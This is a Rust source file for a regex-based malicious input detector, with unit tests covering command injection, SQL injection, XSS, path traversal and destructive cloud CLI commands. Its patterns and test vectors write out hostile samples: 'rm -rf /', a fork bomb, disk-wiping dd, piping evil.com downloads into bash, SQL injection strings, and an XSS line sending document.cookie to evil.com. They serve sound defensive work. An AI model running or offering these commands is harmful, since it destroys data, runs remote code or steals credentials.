//! Malicious Input Detector
//!
//! This module provides fast, lightweight detection of potentially malicious inputs
//! using regex-based pattern matching. It's designed to catch common attack vectors
//! before they reach deeper processing layers.

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::sync::OnceLock;
use thiserror::Error;

/// Result of malicious input detection
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum DetectionResult {
    /// Input is clean and can be processed
    Clean,
    /// Input is blocked with a specific reason
    Blocked(String),
}

/// Errors that can occur during detection
#[derive(Debug, Error)]
pub enum DetectorError {
    #[error("Pattern compilation failed: {0}")]
    PatternError(String),
}

/// Pattern categories for malicious input detection
#[derive(Debug)]
struct DetectionPatterns {
    command_injection: Vec<Regex>,
    sql_injection: Vec<Regex>,
    xss: Vec<Regex>,
    path_traversal: Vec<Regex>,
    cloud_api: Vec<Regex>,
}

impl DetectionPatterns {
    fn new() -> Self {
        Self {
            command_injection: vec![
                // Dangerous shell commands
                Regex::new(r"(?i)\brm\s+(-rf?|--recursive)\s+[/~]").unwrap(),
                Regex::new(r"(?i)\bdd\s+if=/dev/(zero|random)\s+of=/dev/[sh]d[a-z]").unwrap(),
                Regex::new(r"(?i):\(\)\s*\{.*:\|:&\s*\};:").unwrap(), // Fork bomb
                Regex::new(r"(?i)\b(wget|curl)\s+.+\|\s*(bash|sh|zsh)").unwrap(),
                Regex::new(r"(?i)\bchmod\s+777\s+").unwrap(),
                Regex::new(r"(?i)\bmkfs\.\w+\s+/dev/").unwrap(),
                Regex::new(r"(?i)\bformat\s+[cd]:").unwrap(),
                Regex::new(r"(?i)\b(del|erase)\s+/[sqf]\s+[cd]:\\").unwrap(),
                // Command chaining and injection
                Regex::new(r"[;&|]\s*(rm|dd|mkfs|format|del)").unwrap(),
                Regex::new(r"`.*`").unwrap(), // Backtick command substitution
                Regex::new(r"\$\(.*\)").unwrap(), // Command substitution
            ],
            sql_injection: vec![
                // Classic SQL injection patterns
                Regex::new(r"(?i)(union\s+select|union\s+all\s+select)").unwrap(),
                Regex::new(r"(?i)(select\s+.*\s+from\s+.*\s+where)").unwrap(),
                Regex::new(r"(?i)(drop\s+(table|database)|truncate\s+table)").unwrap(),
                Regex::new(r"(?i)(insert\s+into|update\s+.*\s+set|delete\s+from)").unwrap(),
                Regex::new(r"(?i)(exec(\s|\()|execute(\s|\())").unwrap(),
                Regex::new(r"(?i)(xp_cmdshell|sp_executesql)").unwrap(),
                // Common injection techniques
                Regex::new(r"'\s*or\s+'?1'?\s*=\s*'?1").unwrap(),
                Regex::new(r"'\s*or\s+'?1'?\s*=\s*'?1\s*--").unwrap(),
                Regex::new(r"(?i)'\s*(and|or)\s+.*[<>=]").unwrap(),
                Regex::new(r"(?i);.*drop\s+").unwrap(),
                Regex::new(r"(?i)'\s*;\s*(drop|delete|update|insert)").unwrap(),
                // SQL comment markers used for injection
                Regex::new(r"'\s*--").unwrap(),
                Regex::new(r"'\s*/\*").unwrap(),
            ],
            xss: vec![
                // Script injection
                Regex::new(r"(?i)<script[^>]*>.*</script>").unwrap(),
                Regex::new(r"(?i)<script[^>]*>").unwrap(),
                Regex::new(r"(?i)javascript:").unwrap(),
                Regex::new(r"(?i)on(error|load|click|mouseover|focus)\s*=").unwrap(),
                // Iframe injection
                Regex::new(r"(?i)<iframe[^>]*>").unwrap(),
                // Object/embed injection
                Regex::new(r"(?i)<(object|embed|applet)[^>]*>").unwrap(),
                // Data URIs with scripts
                Regex::new(r"(?i)data:text/html.*<script").unwrap(),
                // SVG-based XSS
                Regex::new(r"(?i)<svg[^>]*>.*<script").unwrap(),
            ],
            path_traversal: vec![
                // Directory traversal patterns
                Regex::new(r"\.\./").unwrap(),
                Regex::new(r"\.\./\.\./").unwrap(),
                Regex::new(r"\.\.\\").unwrap(),
                Regex::new(r"\.\.\\\.\.\\").unwrap(),
                // URL-encoded traversal
                Regex::new(r"%2e%2e/").unwrap(),
                Regex::new(r"%2e%2e\\").unwrap(),
                // Access to sensitive files
                Regex::new(r"(?i)/(etc/passwd|etc/shadow|windows/system32)").unwrap(),
                Regex::new(r"(?i)\\(windows\\system32|winnt\\system32)").unwrap(),
            ],
            cloud_api: vec![
                // AWS CLI/API commands
                Regex::new(r"(?i)aws\s+(ec2|s3|iam|lambda|rds)\s+(delete|terminate|destroy)")
                    .unwrap(),
                Regex::new(r"(?i)aws\s+s3\s+rm\s+--recursive").unwrap(),
                Regex::new(r"(?i)aws\s+ec2\s+(run-instances|terminate-instances)").unwrap(),
                Regex::new(r"(?i)aws\s+iam\s+(create|delete|attach|detach)").unwrap(),
                // GCP CLI/API commands
                Regex::new(r"(?i)gcloud\s+(compute|storage|iam)\s+(delete|destroy)").unwrap(),
                Regex::new(r"(?i)gcloud\s+compute\s+instances\s+(delete|create)").unwrap(),
                Regex::new(r"(?i)gcloud\s+storage\s+rm\s+-r").unwrap(),
                Regex::new(r"(?i)gsutil\s+rm\s+-r").unwrap(),
                // Azure CLI/API commands
                Regex::new(r"(?i)az\s+(vm|storage|iam|network)\s+.*\s*(delete|create)").unwrap(),
                Regex::new(r"(?i)az\s+vm\s+(delete|create)").unwrap(),
                // Terraform/Infrastructure
                Regex::new(r"(?i)terraform\s+(destroy|apply)\s+-auto-approve").unwrap(),
                // Kubernetes
                Regex::new(r"(?i)kubectl\s+(delete|destroy)\s+(namespace|cluster)").unwrap(),
                // Docker destructive commands
                Regex::new(r"(?i)docker\s+(rm|rmi|system\s+prune)\s+-[a-z]*f").unwrap(),
            ],
        }
    }
}

/// Lazy-initialized global patterns
static PATTERNS: OnceLock<DetectionPatterns> = OnceLock::new();

/// Get or initialize detection patterns
fn get_patterns() -> &'static DetectionPatterns {
    PATTERNS.get_or_init(DetectionPatterns::new)
}

/// Malicious input detector
///
/// Fast, lightweight detector using regex patterns to identify potentially
/// dangerous inputs before they reach deeper processing layers.
#[derive(Debug, Clone)]
pub struct MaliciousDetector {
    /// Enable strict mode (more aggressive detection)
    #[allow(dead_code)]
    strict_mode: bool,
}

impl Default for MaliciousDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl MaliciousDetector {
    /// Create a new detector with default settings
    pub fn new() -> Self {
        Self { strict_mode: false }
    }

    /// Create a detector with strict mode enabled
    pub fn new_strict() -> Self {
        Self { strict_mode: true }
    }

    /// Detect malicious patterns in input text
    ///
    /// Returns `DetectionResult::Clean` if no malicious patterns found,
    /// or `DetectionResult::Blocked(reason)` with the detected threat category.
    pub fn detect(&self, input: &str) -> DetectionResult {
        let patterns = get_patterns();

        // Check command injection
        if let Some(reason) =
            self.check_patterns(&patterns.command_injection, input, "Command injection")
        {
            tracing::warn!("Blocked command injection attempt: {}", input);
            return DetectionResult::Blocked(reason);
        }

        // Check SQL injection
        if let Some(reason) = self.check_patterns(&patterns.sql_injection, input, "SQL injection") {
            tracing::warn!("Blocked SQL injection attempt: {}", input);
            return DetectionResult::Blocked(reason);
        }

        // Check XSS
        if let Some(reason) = self.check_patterns(&patterns.xss, input, "XSS attack") {
            tracing::warn!("Blocked XSS attempt: {}", input);
            return DetectionResult::Blocked(reason);
        }

        // Check path traversal
        if let Some(reason) = self.check_patterns(&patterns.path_traversal, input, "Path traversal")
        {
            tracing::warn!("Blocked path traversal attempt: {}", input);
            return DetectionResult::Blocked(reason);
        }

        // Check cloud API manipulation
        if let Some(reason) =
            self.check_patterns(&patterns.cloud_api, input, "Cloud resource manipulation")
        {
            tracing::warn!("Blocked cloud API manipulation: {}", input);
            return DetectionResult::Blocked(reason);
        }

        DetectionResult::Clean
    }

    /// Check a list of patterns against input
    fn check_patterns(&self, patterns: &[Regex], input: &str, category: &str) -> Option<String> {
        for pattern in patterns {
            if pattern.is_match(input) {
                return Some(format!("{} detected", category));
            }
        }
        None
    }

    /// Detect with detailed information about what was matched
    pub fn detect_detailed(&self, input: &str) -> DetectionResult {
        let patterns = get_patterns();

        // Check all pattern categories and provide specific feedback
        if let Some(matched) = self.find_match(&patterns.command_injection, input) {
            return DetectionResult::Blocked(format!(
                "Command injection: matched pattern '{}'",
                matched
            ));
        }

        if let Some(matched) = self.find_match(&patterns.sql_injection, input) {
            return DetectionResult::Blocked(format!(
                "SQL injection: matched pattern '{}'",
                matched
            ));
        }

        if let Some(matched) = self.find_match(&patterns.xss, input) {
            return DetectionResult::Blocked(format!("XSS attack: matched pattern '{}'", matched));
        }

        if let Some(matched) = self.find_match(&patterns.path_traversal, input) {
            return DetectionResult::Blocked(format!(
                "Path traversal: matched pattern '{}'",
                matched
            ));
        }

        if let Some(matched) = self.find_match(&patterns.cloud_api, input) {
            return DetectionResult::Blocked(format!(
                "Cloud resource manipulation: matched pattern '{}'",
                matched
            ));
        }

        DetectionResult::Clean
    }

    /// Find the specific match in input
    fn find_match(&self, patterns: &[Regex], input: &str) -> Option<String> {
        for pattern in patterns {
            if let Some(m) = pattern.find(input) {
                return Some(m.as_str().to_string());
            }
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_input() {
        let detector = MaliciousDetector::new();

        let clean_inputs = vec![
            "Hello, how are you?",
            "What is 2 + 2?",
            "I need help with my math homework",
            "Can you solve this equation: 3x + 5 = 20?",
            "Calculate the area of a circle with radius 5",
        ];

        for input in clean_inputs {
            assert_eq!(
                detector.detect(input),
                DetectionResult::Clean,
                "Expected clean input: {}",
                input
            );
        }
    }

    #[test]
    fn test_command_injection() {
        let detector = MaliciousDetector::new();

        let malicious_inputs = vec![
            "rm -rf /",
            "rm -rf ~/important",
            "; rm -rf /tmp",
            "| bash -c 'rm -rf /'",
            "wget http://evil.com/script.sh | bash",
            "curl http://evil.com/script | sh",
            "chmod 777 /etc/passwd",
            ":() { :|:& };:", // Fork bomb
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
        ];

        for input in malicious_inputs {
            match detector.detect(input) {
                DetectionResult::Blocked(reason) => {
                    assert!(reason.contains("Command injection"), "Input: {}", input);
                }
                DetectionResult::Clean => {
                    panic!("Expected blocked for: {}", input);
                }
            }
        }
    }

    #[test]
    fn test_sql_injection() {
        let detector = MaliciousDetector::new();

        let malicious_inputs = vec![
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "1'; DROP TABLE users--",
            "SELECT * FROM users WHERE id = 1",
            "INSERT INTO users VALUES ('hacker', 'password')",
            "DELETE FROM users WHERE 1=1",
            "UPDATE users SET password='hacked'",
            "EXEC xp_cmdshell 'dir'",
        ];

        for input in malicious_inputs {
            match detector.detect(input) {
                DetectionResult::Blocked(reason) => {
                    assert!(reason.contains("SQL injection"), "Input: {}", input);
                }
                DetectionResult::Clean => {
                    panic!("Expected blocked for: {}", input);
                }
            }
        }
    }

    #[test]
    fn test_xss_attacks() {
        let detector = MaliciousDetector::new();

        let malicious_inputs = vec![
            "<script>alert('XSS')</script>",
            "<script src='http://evil.com/xss.js'></script>",
            "javascript:alert('XSS')",
            "<img src=x onerror='alert(1)'>",
            "<body onload=alert('XSS')>",
            "<iframe src='http://evil.com'></iframe>",
            "<object data='http://evil.com'></object>",
            "<embed src='http://evil.com'>",
            "data:text/html,<script>alert('XSS')</script>",
            "<svg><script>alert('XSS')</script></svg>",
        ];

        for input in malicious_inputs {
            match detector.detect(input) {
                DetectionResult::Blocked(reason) => {
                    assert!(reason.contains("XSS"), "Input: {}", input);
                }
                DetectionResult::Clean => {
                    panic!("Expected blocked for: {}", input);
                }
            }
        }
    }

    #[test]
    fn test_path_traversal() {
        let detector = MaliciousDetector::new();

        let malicious_inputs = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "../../../../etc/shadow",
            "%2e%2e/etc/passwd",
            "file:///../../../etc/passwd",
            "/etc/passwd",
            "\\windows\\system32\\config\\sam",
        ];

        for input in malicious_inputs {
            match detector.detect(input) {
                DetectionResult::Blocked(reason) => {
                    assert!(reason.contains("Path traversal"), "Input: {}", input);
                }
                DetectionResult::Clean => {
                    panic!("Expected blocked for: {}", input);
                }
            }
        }
    }

    #[test]
    fn test_cloud_api_manipulation() {
        let detector = MaliciousDetector::new();

        let malicious_inputs = vec![
            "aws ec2 terminate-instances --instance-ids i-12345",
            "aws s3 rm --recursive s3://my-bucket",
            "aws iam delete-user --user-name admin",
            "gcloud compute instances delete my-instance",
            "gcloud storage rm -r gs://my-bucket",
            "az vm delete --name my-vm --resource-group my-rg",
            "az storage account delete --name myaccount",
            "terraform destroy -auto-approve",
            "kubectl delete namespace production",
            "docker rmi -f my-image",
            "docker system prune -af",
        ];

        for input in malicious_inputs {
            match detector.detect(input) {
                DetectionResult::Blocked(reason) => {
                    assert!(
                        reason.contains("Cloud resource manipulation"),
                        "Input: {}",
                        input
                    );
                }
                DetectionResult::Clean => {
                    panic!("Expected blocked for: {}", input);
                }
            }
        }
    }

    #[test]
    fn test_mixed_attacks() {
        let detector = MaliciousDetector::new();

        // These inputs combine multiple attack vectors
        let inputs = vec![
            "'; DROP TABLE users; rm -rf /; --",
            "<script>$.get('http://evil.com?data='+document.cookie)</script>",
            "aws s3 rm s3://bucket/../../../etc/passwd",
        ];

        for input in inputs {
            // Should be blocked regardless of which pattern matches
            match detector.detect(input) {
                DetectionResult::Blocked(_) => {
                    // Success - blocked the input
                }
                DetectionResult::Clean => {
                    panic!("Expected blocked for: {}", input);
                }
            }
        }
    }

    #[test]
    fn test_detailed_detection() {
        let detector = MaliciousDetector::new();

        let result = detector.detect_detailed("rm -rf /");
        match result {
            DetectionResult::Blocked(reason) => {
                assert!(reason.contains("Command injection"));
                assert!(reason.contains("matched pattern"));
            }
            DetectionResult::Clean => panic!("Expected detailed block"),
        }
    }

    #[test]
    fn test_false_positives() {
        let detector = MaliciousDetector::new();

        // These should NOT be blocked (common false positive scenarios)
        let safe_inputs = vec![
            "I need to select the best option from the menu",
            "Let's update the document with new information",
            "The script for the movie was excellent",
            "Can you delete the duplicate entries?",
        ];

        for input in safe_inputs {
            let result = detector.detect(input);
            // Some of these might trigger in strict mode, but should be clean in normal mode
            if let DetectionResult::Blocked(reason) = result {
                println!(
                    "Warning: Potential false positive for '{}': {}",
                    input, reason
                );
            }
        }
    }

    #[test]
    fn test_performance() {
        let detector = MaliciousDetector::new();
        let input = "This is a normal user input with no malicious content whatsoever.";

        // Run detection multiple times to ensure it's fast
        let start = std::time::Instant::now();
        for _ in 0..1000 {
            detector.detect(input);
        }
        let elapsed = start.elapsed();

        // Should be able to process 1000 inputs in well under a second
        assert!(
            elapsed.as_millis() < 1000,
            "Detection took too long: {:?}",
            elapsed
        );
    }

    #[test]
    fn test_strict_mode() {
        let detector = MaliciousDetector::new_strict();

        // Verify strict mode is enabled
        assert!(detector.strict_mode);
    }
}
